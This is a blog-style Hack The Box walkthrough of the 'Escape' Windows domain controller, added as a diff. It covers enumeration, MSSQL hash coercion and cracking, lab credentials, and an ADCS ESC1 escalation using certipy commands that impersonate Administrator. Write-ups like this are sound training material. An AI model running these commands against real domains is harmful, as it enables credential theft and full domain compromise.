@@ -1,0 +1,243 @@
+---
+title: HTB-Escape
+published: 2026-01-24
+toc: true
+draft: false
+tags:
+  - ADCS
+  - ESC1
+  - MSSQL
+  - enum4linux
+  - kerbrute
+---
+
+```
+Scope:
+10.129.228.253
+```
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- --min-rate=5000 -Pn -T5 -vvvv escape.htb
+
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-01-24 16:18:45Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-24T16:20:13+00:00; +7h59m48s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
+|_ssl-date: 2026-01-24T16:20:14+00:00; +7h59m48s from scanner time.
+1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.228.253:1433: 
+|     Target_Name: sequel
+|     NetBIOS_Domain_Name: sequel
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: dc.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.129.228.253:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
+3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-24T16:20:14+00:00; +7h59m48s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49689/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49713/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49740/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 29662/tcp): CLEAN (Timeout)
+|   Check 2 (port 16305/tcp): CLEAN (Timeout)
+|   Check 3 (port 12096/udp): CLEAN (Timeout)
+|   Check 4 (port 48343/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: 7h59m47s, deviation: 0s, median: 7h59m47s
+| smb2-time: 
+|   date: 2026-01-24T16:19:36
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+```
+
+## kerbrute
+
+Using `kerbrute` I was able to find the following service accounts present:
+
+![](attachments/bcc8ca6af6913c9465e08cbff1d816f4.png)
+
+I reran `kerbrute` a couple times to check for usernames but wasn't able to get any hits, instead I ran `enum4linux-ng` as the *guest* user:
+
+## enum4linux-ng
+
+![](attachments/308b06b6ca6b56f4eb575a8b1f5e981b.png)
+
+The following info was found:
+
+![](attachments/a1d1fd8d93f51ad13cc1397bcd98762a.png)
+
+![](attachments/380d6e1eceebd04bcb936c984b7a62aa.png)
+
+The **Public** share appears to be readable.
+
+![](attachments/1437de9b05f059c92dce59f185e0cec2.png)
+
+I downloaded the file and checked out the contents:
+
+![](attachments/42f8d2e87ebfa46f66ea8404fb5ea0ea.png)
+
+And there was also a **Bonus** tab heading:
+
+![](attachments/b7195f5e0b358015d01237a749845fbf.png)
+
+```
+PublicUser
+GuestUserCantWrite1
+```
+
+## nxc
+
+It appeared that this user was still valid:
+
+![](attachments/a98de66d9fac6e7658ba6cb28a85144b.png)
+
+Using this user I was able to enumerate other domain users:
+
+![](attachments/5e90b07712913b768a729cd40f59d387.png)
+
+### mssql_coerce
+
+Using the following commands I was then able to coerce the *sql_svc* account into authenticating to our host:
+
+![](attachments/8beeaeabfa744f4ce50297239a153172.png)
+
+In `responder` I saw the following pop up:
+
+![](attachments/db847e53184650d8a61d95854cf50b74.png)
+
+I then proceeded to crack it using hashcat:
+
+![](attachments/ef41e81408e6bca5d90b6d56efce818e.png)
+
+![](attachments/df3333213497d5f90b7e2fb5213b307a.png)
+
+```
+sql_svc
+REGGIE1234ronnie
+```
+
+Moving on I enumerated whether this user had any specific rights on the `mssql` server but I didn't manage to find anything useful:
+
+![](attachments/ce8951c0de08657e250e5cd5ada605fd.png)
+
+Instead I sprayed the passwords against the other services and noticed I could log into winrm with this user.
+
+![](attachments/83f9af8436ff266513d36d33dab1dcc4.png)
+
+# Foothold
+## Shell as sql_svc
+
+![](attachments/cb5a87a9e4ec375366fc74eab81cb0de.png)
+
+I did not notice anything interesting inside my home directory but did notice the **SQLServer** directory under `C:\`:
+
+![](attachments/54969b7dd8f3ea7d959015b6f7789736.png)
+
+## Cleartext Credentials
+
+I then checked out the error log inside the **Logs** directory where I found something:
+
+![](attachments/86a5576410384205061f39a30aabe676.png)
+
+![](attachments/6aa71050b7f2c4cd67661c4610c956a2.png)
+
+It appears that a user, perhaps *ryan*, tried to log in with their password instead of their username. Let's check our suspicions.
+
+![](attachments/ec3affc0c7d161d0b6f8ffb64490cf2b.png)
+
+While they didn't seem to be very useful for `mssql`, they also worked for `winrm`:
+
+![](attachments/eaa4c2b8b90678f10d92badc2619578a.png)
+
+## Lateral Movement to ryan.cooper
+
+![](attachments/5e0ebbd5c85c82349f084db7adc1c620.png)
+
+### user.txt
+
+![](attachments/5c5e4f52f6a4b81b6af0fb76e3af76e5.png)
+
+# Privilege Escalation
+## ADCS - ESC1
+
+Using *ryan*'s credentials I enumerated the target with `certipy-ad` which displayed the target being vulnerable to **ESC1**:
+
+```bash
+certipy-ad find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -stdout -vulnerable
+```
+
+![](attachments/6b2a2ad02e2e9cbeee25e0a4650d76bb.png)
+
+![](attachments/3cf77c8d51553b0081eabf0491f451df.png)
+
+In order to exploit this vulnerability I used the following command:
+
+```bash
+certipy-ad req -username ryan.cooper@sequel.htb -p 'NuclearMosquito3' -ca sequel-DC-CA -template UserAuthentication -dc-ip 10.129.228.253 -upn Administrator@sequel.htb
+```
+
+![](attachments/2882ecba7ca9d557af53563b10234a48.png)
+
+Next up I authenticated as the *Administrator*, changed their password via `ldap-shell` and logged in:
+
+![](attachments/b3f6fef6e3fc716af1288a8034e04882.png)
+
+### root.txt
+
+![](attachments/cc16b77ff079c08e10436db5dc46aee5.png)
+
+![](attachments/017648c689e84151ab6f858ff0296c11.png)
+
+# Addendum
+
+This box was also my 100th rooted machine on HTB:
+
+![](attachments/4b8df085621cd288f2bb313d190c25f5.png)
+
+---
